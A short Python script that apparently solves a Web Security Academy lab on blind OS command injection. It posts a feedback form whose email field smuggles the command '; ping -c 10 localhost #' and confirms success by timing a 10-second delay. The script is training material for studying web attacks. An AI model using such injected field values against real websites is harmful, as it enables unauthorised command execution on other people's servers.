from web_security_academy.core.logger import logger
import time


def solve_lab(session):
    csrf = session.get_csrf_token("/feedback")

    payload = "; ping -c 10 localhost #"
    data = {
        "csrf": csrf,
        "name": "user",
        "email": f"user@example.com{payload}",
        "subject": "Example Subject",
        "message": "This is an example message.",
    }

    path = "/feedback/submit"
    logger.info(
        f'Causing a 10 second delay by sending a POST request to "{path}" with the following data:'
    )
    print(f"{data}")

    start = time.perf_counter()
    session.post_path(path, data=data)
    end = time.perf_counter()

    response_time = end - start
    if response_time > 10:
        logger.success(f"Response time: {response_time} seconds")
    else:
        logger.failure(f"Response time: {response_time} seconds")
